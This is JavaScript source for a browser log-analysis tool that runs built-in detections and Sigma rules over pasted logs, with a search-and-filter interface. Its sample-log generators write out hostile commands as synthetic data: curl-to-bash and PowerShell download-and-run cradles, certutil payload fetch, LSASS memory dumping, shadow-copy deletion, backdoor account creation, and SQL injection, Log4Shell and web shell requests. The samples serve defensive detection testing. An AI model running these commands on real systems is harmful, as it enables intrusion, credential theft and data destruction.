/* Yoroi · HUNT — paste / drop / sample logs → parse → built-in detections + enabled Sigma → findings, stats, timeline, events.
 * Also publishes W.yoroiHunt = {SAMPLES, ruleset()} for the RULES and SYNTH tools (they load after this file). */
(function () {
  "use strict";
  const { $, $$, esc, ui } = W;

  // ---------------------------------------------------------------- sample logs (RFC 5737 documentation IPs only)
  const u16 = (s) => W.b64(Uint8Array.from([...s].flatMap((c) => [c.charCodeAt(0) & 255, c.charCodeAt(0) >> 8])));
  const SAMPLES = {
    "SSH brute force (auth.log)": () => {
      const L = [], users = ["root", "admin", "oracle", "test", "ubuntu", "deploy", "git", "postgres"];
      for (let i = 0; i < 18; i++) L.push(`Nov 14 03:1${(i / 6) | 0}:${String(10 + i * 2).padStart(2, "0")} web01 sshd[${2100 + i}]: Failed password for ${i % 3 ? "invalid user " : ""}${users[i % users.length]} from 203.0.113.50 port ${40000 + i} ssh2`);
      L.push("Nov 14 03:14:02 web01 sshd[2140]: Accepted password for deploy from 203.0.113.50 port 40188 ssh2",
        "Nov 14 03:14:02 web01 sshd[2140]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)",
        "Nov 14 03:15:40 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
        "Nov 14 03:16:05 web01 useradd[2201]: new user: name=sysupd, UID=0, GID=0, home=/root, shell=/bin/bash",
        "Nov 14 03:16:30 web01 usermod[2205]: add 'sysupd' to group 'sudo'",
        "Nov 14 03:17:12 web01 sudo:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.23/x.sh | bash",
        "Nov 14 03:18:44 web01 CRON[2301]: (root) CMD (/tmp/.x/upd >/dev/null 2>&1)",
        "Nov 14 09:02:11 web01 sshd[3100]: Accepted publickey for alice from 192.0.2.10 port 51234 ssh2");
      return L.join("\n");
    },
    "Web attacks (access.log)": () => {
      const ip = "198.51.100.77", t = (s) => `[14/Nov/2026:10:${s}:00 +0000]`;
      const L = [
        `${ip} - - ${t("01")} "GET /index.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 5120 "-" "sqlmap/1.8"`,
        `${ip} - - ${t("02")} "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 1820 "-" "Mozilla/5.0"`,
        `${ip} - - ${t("03")} "GET /?x=\${jndi:ldap://198.51.100.9:1389/a} HTTP/1.1" 400 0 "-" "\${jndi:ldap://198.51.100.9/e}"`,
        `${ip} - - ${t("04")} "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 64 "-" "curl/8.4"`,
        `${ip} - - ${t("05")} "GET /.env HTTP/1.1" 404 0 "-" "Mozilla/5.0"`, `${ip} - - ${t("05")} "GET /.git/config HTTP/1.1" 404 0 "-" "Mozilla/5.0"`];
      for (let i = 0; i < 40; i++) L.push(`192.0.2.200 - - ${t(String(10 + (i % 40)).padStart(2, "0"))} "GET /admin${i}.php HTTP/1.1" 404 0 "-" "Nikto/2.5.0"`);
      for (let i = 0; i < 6; i++) L.push(`192.0.2.${15 + i} - - ${t(String(50 + i))} "GET /${["", "about", "blog", "contact", "pricing", "docs"][i]} HTTP/1.1" 200 ${9000 - i * 700} "-" "Mozilla/5.0 (Windows NT 10.0)"`);
      return L.join("\n");
    },
    "Windows / Sysmon (XML)": () => {
      const ev = (id, prov, time, data) => `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="${prov}"/><EventID>${id}</EventID><TimeCreated SystemTime="2026-11-14T${time}.000Z"/><Computer>FIN-WS07.corp.local</Computer></System><EventData>${Object.entries(data).map(([k, v]) => `<Data Name="${k}">${v.replace(/&/g, "&amp;").replace(/</g, "&lt;")}</Data>`).join("")}</EventData></Event>`;
      const S = "Microsoft-Windows-Sysmon", SEC = "Microsoft-Windows-Security-Auditing";
      const enc = u16("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')");
      const L = [];
      for (let i = 0; i < 6; i++) L.push(ev(4625, SEC, `08:0${i}:1${i}`, { TargetUserName: ["svc_backup", "jsmith", "administrator", "hr01", "it_admin", "kpatel"][i], IpAddress: "203.0.113.80", LogonType: "3", Status: "0xc000006d" }));
      L.push(ev(1, S, "09:12:01", { Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: `powershell.exe -nop -w hidden -enc ${enc}`, ParentImage: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", User: "CORP\\jsmith" }));
      L.push(ev(1, S, "09:13:20", { Image: "C:\\Windows\\System32\\certutil.exe", CommandLine: "certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe", ParentImage: "C:\\Windows\\System32\\cmd.exe", User: "CORP\\jsmith" }));
      L.push(ev(1, S, "09:14:05", { Image: "C:\\Users\\Public\\p.exe", CommandLine: "C:\\Users\\Public\\p.exe", ParentImage: "C:\\Windows\\System32\\cmd.exe", User: "CORP\\jsmith" }));
      ["whoami /all", "net group \"domain admins\" /domain", "nltest /domain_trusts", "ipconfig /all"].forEach((c, i) => L.push(ev(1, S, `09:15:0${i}`, { Image: "C:\\Windows\\System32\\cmd.exe", CommandLine: "cmd.exe /c " + c, User: "CORP\\jsmith" })));
      L.push(ev(1, S, "09:20:00", { Image: "C:\\Windows\\System32\\rundll32.exe", CommandLine: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Users\\Public\\l.dmp full", User: "CORP\\jsmith" }));
      L.push(ev(1, S, "09:22:00", { Image: "C:\\Windows\\System32\\schtasks.exe", CommandLine: "schtasks /create /tn Updater /tr C:\\Users\\Public\\p.exe /sc onlogon /ru SYSTEM", User: "CORP\\jsmith" }));
      L.push(ev(1, S, "09:40:00", { Image: "C:\\Windows\\System32\\vssadmin.exe", CommandLine: "vssadmin.exe delete shadows /all /quiet", User: "CORP\\jsmith" }));
      L.push(ev(1102, "Microsoft-Windows-Eventlog", "09:41:00", { SubjectUserName: "jsmith" }));
      return L.join("\n");
    },
    "AWS CloudTrail (JSON)": () => {
      const r = (name, src, t, ip, ui, extra) => Object.assign({ eventVersion: "1.08", eventSource: src, eventName: name, eventTime: `2026-11-14T02:${t}:00Z`, awsRegion: "us-east-1", sourceIPAddress: ip, userIdentity: ui }, extra || {});
      const mal = { type: "IAMUser", userName: "mallory", arn: "arn:aws:iam::111122223333:user/mallory" };
      const recs = [
        r("ConsoleLogin", "signin.amazonaws.com", "00", "198.51.100.61", { type: "Root", arn: "arn:aws:iam::111122223333:root" }, { responseElements: { ConsoleLogin: "Success" }, additionalEventData: { MFAUsed: "No" } }),
        r("CreateUser", "iam.amazonaws.com", "01", "198.51.100.61", mal, { requestParameters: { userName: "backup-svc" } }),
        r("AttachUserPolicy", "iam.amazonaws.com", "02", "198.51.100.61", mal, { requestParameters: { userName: "backup-svc", policyArn: "arn:aws:iam::aws:policy/AdministratorAccess" } }),
        r("CreateAccessKey", "iam.amazonaws.com", "03", "198.51.100.61", mal, { requestParameters: { userName: "backup-svc" } }),
        r("StopLogging", "cloudtrail.amazonaws.com", "04", "198.51.100.61", mal, { requestParameters: { name: "org-trail" } }),
        r("ListBuckets", "s3.amazonaws.com", "05", "192.0.2.44", { type: "IAMUser", userName: "alice" }),
      ];
      for (let i = 0; i < 12; i++) recs.push(r("DescribeInstances", "ec2.amazonaws.com", String(10 + i), "203.0.113.200", { type: "IAMUser", userName: "ci-bot" }, { errorCode: "AccessDenied" }));
      return JSON.stringify({ Records: recs }, null, 1);
    },
  };

  // ---------------------------------------------------------------- rule set (shared with RULES / SYNTH)
  /** The detections + Sigma rules a hunt runs, honouring RULES' toggles. */
  function ruleset() {
    const disabled = W.store.get("yoroi.rules.disabled", []) || [];
    const off = new Set(disabled);
    const errors = [];
    let sigma = [];
    try { sigma = W.eng.sigma.builtinRules().filter((r) => !off.has(r.id)); } catch (e) { errors.push(e.message); }
    for (const r of W.store.get("yoroi.rules.sigma", []) || []) {
      if (r.enabled === false) continue;
      const c = W.eng.sigma.compile(r.text || "");
      sigma = sigma.concat(c.rules);
      errors.push(...c.errors.map((x) => `${r.name || "rule"}: ${x}`));
    }
    return { disabled, sigma, errors, thresholds: W.store.get("yoroi.rules.thresholds", {}) || {} };
  }
  W.yoroiHunt = { SAMPLES, ruleset };

  // ---------------------------------------------------------------- hunt
  const FILE_CAP = 32 * 1048576;      // bytes read from a dropped file
  const SEVS = ["critical", "high", "medium", "low", "info"];
  let LAST = null;                    // {text, fmt, name, res, note} — survives navigating to SYNTH and back

  function hunt(text, fmt, withSigma) {
    const t0 = performance.now();
    const parsed = W.eng.logs.parse(text, fmt);
    const evs = parsed.events;
    const rs = ruleset();
    let findings = W.eng.detect.run(evs, rs.thresholds, rs.disabled);
    if (withSigma) findings = W.eng.detect.sortFindings(findings.concat(W.eng.sigma.run(rs.sigma, evs)));
    const count = (key) => { const m = new Map(); for (const e of evs) { const v = key(e); if (v) m.set(v, (m.get(v) || 0) + 1); } return [...m].sort((a, b) => b[1] - a[1]); };
    const stamps = evs.map((e) => W.eng.logs.toMs(e.ts)).filter((x) => x != null).sort((a, b) => a - b);
    let hist = [];
    if (stamps.length > 1) {
      const span = (stamps[stamps.length - 1] - stamps[0]) / 1000;
      let bucket = span > 6 * 3600 ? 3600 : span > 1800 ? 300 : 60;
      while (span / bucket > 120) bucket *= 2;
      const m = new Map();
      for (const t of stamps) { const k = Math.floor(t / 1000 / bucket) * bucket; m.set(k, (m.get(k) || 0) + 1); }
      const a = Math.floor(stamps[0] / 1000 / bucket) * bucket, z = Math.floor(stamps[stamps.length - 1] / 1000 / bucket) * bucket;
      for (let k = a; k <= z; k += bucket) hist.push([k, m.get(k) || 0]);
      hist.bucket = bucket;
    }
    return { fmt: parsed.fmt, events: evs, truncated: parsed.truncated, findings, ruleErrors: rs.errors, ms: Math.round(performance.now() - t0),
      stats: { ips: count((e) => e.ip), users: count((e) => e.user), eids: count((e) => e.eid), actions: count((e) => e.action || "other"),
        hosts: count((e) => e.host), hist, first: stamps.length ? stamps[0] : null, last: stamps.length ? stamps[stamps.length - 1] : null } };
  }

  const fmtTs = (ts) => (ts ? String(ts).replace("T", " ").replace(/Z$/, "") : "—");
  const msIso = (t) => (t == null ? "—" : new Date(t).toISOString().slice(0, 16).replace("T", " "));
  const caseVerdict = (sev) => (sev === "critical" || sev === "high" ? "malicious" : "suspicious");
  function caseItems(f) {
    const out = [], tags = ["yoroi:hunt", f.rule].concat(f.attack || []);
    const E = f.entities || {};
    for (const ip of E.ip || []) out.push({ value: ip, verdict: caseVerdict(f.severity), tags, note: f.title });
    for (const u of E.user || []) out.push({ value: u, type: "account", verdict: "suspicious", tags, note: f.title });
    for (const h of E.host || []) out.push({ value: h, type: "host", tags, note: f.title });
    return out;
  }
  const toBlock = (ips) => {
    if (!ips.length) return W.toast("No IPs on this finding", 1);
    if (!(W.tools.yoroi && W.tools.yoroi.block)) return W.copy(ips.join("\n"), "Block tool not installed — IPs copied");
    W.go("yoroi", "block", ips.join("\n"));
  };

  W.tool("yoroi", "hunt", {
    name: "Hunt", order: 10,
    desc: "Threat hunt through auth, web, Windows, JSON or CSV logs with 25 detections + Sigma.",
    icon: '<circle cx="11" cy="11" r="7"/><path d="M21 21l-5-5M11 7v8M7 11h8"/>',
    render(el, arg) {
      el.innerHTML = ui.head("Hunt", "Log analysis", "Paste or drop logs — auth.log/syslog, web access logs, Windows/Sysmon XML, JSON (WinEvent, ECS, CloudTrail) or CSV. 25 behavioural detections and your enabled Sigma rules run locally; nothing is uploaded.") + `
        <section class="panel">
          <div class="row yo-samples"><span class="lbl" style="margin:0">Load a sample</span>${Object.keys(SAMPLES).map((k) => `<button type="button" class="btn sm ghost" data-hs="${esc(k)}">${esc(k)}</button>`).join("")}</div>
          <div class="spacer"></div>
          <textarea id="hu-text" rows="9" spellcheck="false" autocapitalize="off" placeholder="Paste log lines here, or drop a log file onto this box…"></textarea>
          <div class="spacer"></div>
          <div class="row">
            <button type="button" class="btn pri" id="hu-go">${W.icon(W.I.search)} Hunt</button>
            <label class="btn ghost">${W.icon(W.I.up)} Load file<input type="file" id="hu-file"></label>
            <select id="hu-fmt" style="width:auto">${W.eng.logs.FORMATS.map(([v, l]) => `<option value="${v}">${v === "auto" ? "Format: " : ""}${esc(l)}</option>`).join("")}</select>
            <label class="check"><input type="checkbox" id="hu-sig" checked> Sigma rules</label>
            <span class="grow"></span><span class="muted tiny" id="hu-size"></span>
            <button type="button" class="btn sm ghost" id="hu-clr">Clear</button>
          </div>
        </section>
        <div id="hu-out"></div>`;
      const ta = $("#hu-text");
      let loaded = null;      // {name, text, note} for big files kept out of the textarea
      let LAST_NOTE = null;   // truncation note for text shown in the textarea
      const size = () => { $("#hu-size").textContent = loaded ? `${loaded.name} · ${W.fmt.bytes(loaded.text.length)}` : ta.value ? W.fmt.bytes(ta.value.length) : ""; };
      const setText = (text, name, note) => {
        if (text.length > 1048576) { loaded = { name, text, note }; ta.value = ""; ta.placeholder = `${name} — ${W.fmt.bytes(text.length)} loaded (too big to show here). Type or paste to replace it.`; }
        else { loaded = null; ta.value = text; ta.placeholder = "Paste log lines here, or drop a log file onto this box…"; LAST_NOTE = note; }
        size();
      };
      ta.addEventListener("input", () => { loaded = null; LAST_NOTE = null; size(); });
      const readFile = async (f) => {
        const big = f.size > FILE_CAP;
        let text = await W.readFile(big ? f.slice(0, FILE_CAP) : f, "text");
        if (big) text = text.slice(0, text.lastIndexOf("\n") + 1 || text.length);
        setText(text, f.name, big ? `Read the first ${W.fmt.bytes(FILE_CAP)} of ${f.name} (${W.fmt.bytes(f.size)}). Split the file to hunt the rest.` : null);
        run(f.name);
      };
      $("#hu-file").addEventListener("change", (e) => { const f = e.target.files[0]; e.target.value = ""; if (f) readFile(f).catch((x) => W.toast(x.message, 1)); });
      ["dragenter", "dragover"].forEach((t) => ta.addEventListener(t, (e) => { e.preventDefault(); ta.classList.add("yo-over"); }));
      ["dragleave", "drop"].forEach((t) => ta.addEventListener(t, () => ta.classList.remove("yo-over")));
      ta.addEventListener("drop", (e) => { const f = e.dataTransfer && e.dataTransfer.files[0]; if (f) { e.preventDefault(); readFile(f).catch((x) => W.toast(x.message, 1)); } });
      $$("[data-hs]", el).forEach((b) => b.addEventListener("click", () => { $("#hu-fmt").value = "auto"; setText(SAMPLES[b.dataset.hs](), b.dataset.hs, null); run(b.dataset.hs); }));
      $("#hu-clr").addEventListener("click", () => { setText("", "", null); LAST = null; $("#hu-out").innerHTML = ""; });

      async function run(name) {
        const text = loaded ? loaded.text : ta.value;
        if (!text.trim()) return W.toast("Paste some logs or load a sample first", 1);
        $("#hu-out").innerHTML = `<section class="panel">${ui.loader("PARSING + DETECTING")}</section>`;
        await new Promise((r) => setTimeout(r, 30));
        const fmt = $("#hu-fmt").value;
        const res = hunt(text, fmt, $("#hu-sig").checked);
        LAST = { text, fmt, name: name || "pasted", res, note: loaded ? loaded.note : LAST_NOTE, sigma: $("#hu-sig").checked };
        draw($("#hu-out"), LAST);
      }
      W.act("#hu-go", () => run());

      if (arg && (typeof arg === "string" || arg.text)) {
        const a = typeof arg === "string" ? { text: arg } : arg;
        if (a.fmt) $("#hu-fmt").value = a.fmt;
        setText(String(a.text), a.name || "pasted", null); run(a.name);
      } else if (LAST) {
        $("#hu-fmt").value = LAST.fmt; $("#hu-sig").checked = LAST.sigma;
        setText(LAST.text, LAST.name, LAST.note);
        draw($("#hu-out"), LAST);
      }
    },
  });

  function draw(out, st) {
    const r = st.res;
    const sevc = SEVS.map((s) => [s, r.findings.filter((f) => f.severity === s).length]);
    const flagged = new Set(r.findings.flatMap((f) => f.events));
    const hist = r.stats.hist, hmax = Math.max(1, ...hist.map((h) => h[1]));
    const typePairs = (r.stats.eids.length ? r.stats.eids.map(([k, n]) => ["EventID " + k, n]) : r.stats.actions).slice(0, 10);
    out.innerHTML = `<div class="grid g4 yo-stats">
        ${ui.stat(W.fmt.num(r.events.length), "Events · " + r.fmt, true)}
        ${ui.stat(String(r.findings.length), "Findings")}
        <div class="panel stat"><div class="n c-crit">${sevc[0][1] + sevc[1][1]}</div><div class="l">Critical + high</div></div>
        <div class="panel stat"><div class="n">${r.ms}<span class="small muted">ms</span></div><div class="l">${esc(r.stats.first ? msIso(r.stats.first) + " →" : "no timestamps")}</div></div>
      </div>
      ${st.note || r.truncated ? `<div class="callout warn">${esc(st.note || "")} ${r.truncated ? `Parsed the first ${W.fmt.num(W.eng.logs.MAX_EVENTS)} events — the rest of the log was skipped.` : ""}</div><div class="spacer"></div>` : ""}
      ${r.ruleErrors.length ? `<div class="callout warn"><b>Custom Sigma rule errors:</b> ${r.ruleErrors.map(esc).join("; ")}</div><div class="spacer"></div>` : ""}
      ${hist.length > 1 ? `<section class="panel"><h2>Event timeline <span class="faint tiny">· ${hist.bucket >= 3600 ? hist.bucket / 3600 + " h" : hist.bucket / 60 + " min"} buckets</span></h2>
        <div class="yo-hist">${hist.map(([t, n]) => `<i style="height:${n ? Math.max(3, (100 * n) / hmax).toFixed(1) : 0}%" title="${esc(msIso(t * 1000))} · ${n} event(s)"></i>`).join("")}</div>
        <div class="yo-hist-x"><span>${esc(msIso(r.stats.first))}</span><span>${esc(msIso(r.stats.last))}</span></div></section>` : ""}
      <section class="panel">
        <div class="row"><h2 style="margin:0">Findings</h2><span class="grow"></span>
          <div class="row yo-pills" id="hu-pills">${sevc.filter(([, n]) => n).map(([s, n]) => `<button type="button" class="on" data-sev="${s}">${ui.sev(s)} <span class="mono">${n}</span></button>`).join("")}</div>
          ${r.findings.some((f) => f.severity === "critical" || f.severity === "high") ? `<button type="button" class="btn sm" id="hu-allcase">${W.icon(W.I.case)} Crit/high → case</button>` : ""}</div>
        <div class="spacer"></div>
        <div id="hu-find">${r.findings.length ? "" : ui.empty("NO DETECTIONS", "Nothing matched the built-in detections or enabled Sigma rules.")}</div>
      </section>
      <div class="grid g3">
        ${ui.panel("Top source IPs", r.stats.ips.length ? ui.bars(r.stats.ips.slice(0, 10)) : ui.empty("NONE"))}
        ${ui.panel("Top accounts", r.stats.users.length ? ui.bars(r.stats.users.slice(0, 10)) : ui.empty("NONE"))}
        ${ui.panel("Event types", typePairs.length ? ui.bars(typePairs) : ui.empty("NONE"))}
      </div>
      <section class="panel" id="hu-evp">
        <div class="row"><h2 style="margin:0">Events</h2><span class="grow"></span>
          <input type="search" id="hu-q" placeholder="filter: text, ip, user, field…" style="max-width:300px">
          <label class="check"><input type="checkbox" id="hu-flag"> flagged only</label></div>
        <div class="spacer"></div>
        <div class="tablewrap yo-evt" style="max-height:560px"><table class="tbl"><thead><tr><th>#</th><th>Time</th><th>Host</th><th>Source</th><th>Event</th><th>User</th><th>IP</th><th>Message</th></tr></thead><tbody id="hu-rows"></tbody></table></div>
        <div class="row" style="margin-top:8px"><span class="muted tiny" id="hu-count"></span><span class="grow"></span>
          <button type="button" class="btn sm ghost" id="hu-reset" hidden>Show all events</button><button type="button" class="btn sm ghost" id="hu-more">Show more</button></div>
      </section>`;

    const active = new Set(SEVS);
    let filterIdx = null, limit = 200;
    const drawF = () => {
      const fs = r.findings.map((f, k) => [f, k]).filter(([f]) => active.has(f.severity));
      $("#hu-find").innerHTML = fs.map(([f, k]) => {
        const E = f.entities || {};
        return `<div class="finding ${esc(f.severity)}" data-k="${k}"><header>${ui.sev(f.severity, true)}<h3 class="break">${esc(f.title)}</h3>
          <div class="row yo-fbtn"><button type="button" class="btn sm ghost" data-a="ev">Events (${f.count})</button>
          <button type="button" class="btn sm ghost" data-a="rule" title="Synthesise a tuned Sigma rule from these events">⚙ Rule</button>
          <button type="button" class="btn sm ghost" data-a="case" title="Add this finding's entities to the active case">＋ Case</button>
          ${(E.ip || []).length ? `<button type="button" class="btn sm ghost" data-a="blk" title="Send IPs to BLOCK">⛔ Block</button>` : ""}</div></header>
          <div class="yo-meta tiny"><span class="mono muted">${esc(f.rule)} · ${esc(f.name)}</span>${(f.attack || []).map((t) => ui.badge(t, "acc")).join(" ")}</div>
          ${f.detail ? `<div class="det break">${esc(f.detail)}</div>` : ""}
          ${Object.entries(E).filter(([, v]) => v && v.length).map(([kk, v]) => `<div class="row tiny" style="margin-top:6px;gap:4px"><span class="muted mono">${esc(kk)}:</span>${v.slice(0, 12).map((x) => ui.chip(String(x))).join("")}${v.length > 12 ? `<span class="faint">+${v.length - 12}</span>` : ""}</div>`).join("")}</div>`;
      }).join("") || (r.findings.length ? ui.empty("FILTERED", "Every finding is hidden by the severity filter.") : ui.empty("NO DETECTIONS", "Nothing matched."));
    };
    drawF();
    $("#hu-find").addEventListener("click", (e) => {
      const b = e.target.closest("[data-a]"); if (!b) return;
      const f = r.findings[+b.closest("[data-k]").dataset.k];
      if (b.dataset.a === "ev") { filterIdx = new Set(f.events); limit = 500; $("#hu-q").value = ""; drawRows(); $("#hu-evp").scrollIntoView({ behavior: "smooth", block: "start" }); W.toast(`Showing ${f.events.length} event(s) for this finding`); }
      if (b.dataset.a === "rule") {
        if (!f.events.length) return W.toast("This finding has no events to learn from", 1);
        W.go("yoroi", "synth", { text: st.text, fmt: st.fmt, indices: f.events.slice(), title: f.title.slice(0, 80), from: "hunt" });
      }
      if (b.dataset.a === "case") { const items = caseItems(f); if (!items.length) return W.toast("No IPs, accounts or hosts on this finding", 1); W.Case.add(items); }
      if (b.dataset.a === "blk") toBlock(W.uniq((f.entities || {}).ip || []));
    });
    const pills = $("#hu-pills");
    if (pills) pills.addEventListener("click", (e) => { const p = e.target.closest("[data-sev]"); if (!p) return; p.classList.toggle("on"); if (active.has(p.dataset.sev)) active.delete(p.dataset.sev); else active.add(p.dataset.sev); drawF(); });
    const all = $("#hu-allcase");
    if (all) all.addEventListener("click", () => { const items = r.findings.filter((f) => f.severity === "critical" || f.severity === "high").flatMap(caseItems); if (!items.length) return W.toast("No entities on the critical/high findings", 1); W.Case.add(items); });

    const hay = (e) => (e._h || (e._h = [e.msg, e.user, e.ip, e.host, e.src, e.eid, e.action, Object.keys(e.fields).map((k) => k + "=" + (typeof e.fields[k] === "object" ? JSON.stringify(e.fields[k]) : e.fields[k])).join(" ")].join(" ").toLowerCase()));
    function drawRows() {
      const q = $("#hu-q").value.toLowerCase().trim(), fo = $("#hu-flag").checked;
      let rows = r.events;
      if (filterIdx) rows = rows.filter((e) => filterIdx.has(e.i));
      if (fo) rows = rows.filter((e) => flagged.has(e.i));
      if (q) rows = rows.filter((e) => hay(e).includes(q));
      $("#hu-count").textContent = `${W.fmt.num(rows.length)} event(s)${filterIdx ? " · finding filter on" : ""}${rows.length > limit ? ` · showing ${W.fmt.num(limit)}` : ""}`;
      $("#hu-rows").innerHTML = rows.slice(0, limit).map((e) => `<tr class="${flagged.has(e.i) ? "yo-flag" : ""}" data-i="${e.i}"><td class="mono faint">${e.i}</td><td class="mono nowrap">${esc(fmtTs(e.ts))}</td><td>${esc(e.host || "")}</td><td>${esc(e.src || "")}</td>
        <td class="mono">${esc(e.eid || e.action || "")}</td><td>${esc(e.user || "")}</td><td class="mono nowrap">${esc(e.ip || "")}</td><td class="yo-msg">${esc(String(e.msg).slice(0, 240))}</td></tr>`).join("") || `<tr><td colspan="8">${ui.empty("NO EVENTS")}</td></tr>`;
      $("#hu-more").hidden = rows.length <= limit;
      $("#hu-reset").hidden = !filterIdx;
    }
    $("#hu-q").addEventListener("input", W.debounce(drawRows, 150));
    $("#hu-flag").addEventListener("change", drawRows);
    $("#hu-more").addEventListener("click", () => { limit += 500; drawRows(); });
    $("#hu-reset").addEventListener("click", () => { filterIdx = null; drawRows(); });
    $("#hu-rows").addEventListener("click", (e) => {
      const tr = e.target.closest("tr[data-i]"); if (!tr) return;
      const ev = r.events[+tr.dataset.i];
      const fields = Object.keys(ev.fields).map((k) => [k, typeof ev.fields[k] === "object" && ev.fields[k] != null ? JSON.stringify(ev.fields[k]) : String(ev.fields[k] == null ? "" : ev.fields[k])]);
      const hits = r.findings.filter((f) => f.events.includes(ev.i));
      W.modal(`${ui.kv([["Time", ev.ts || "—"], ["Format", ev.fmt], ["Host", ev.host], ["Source", ev.src], ["Event", ev.eid], ["Action", ev.action], ["User", ev.user], ["IP", ev.ip]])}
        ${hits.length ? `<div class="spacer"></div><div class="row">${hits.map((f) => ui.sev(f.severity) + ` <span class="small">${esc(f.title)}</span>`).join("<br>")}</div>` : ""}
        <div class="spacer"></div><pre class="out">${esc(ev.msg)}</pre><div class="spacer"></div>
        <div class="yo-kv-scroll">${ui.kv(fields.slice(0, 120))}</div>`, { title: `Event #${ev.i}` });
    });
    drawRows();
  }
})();
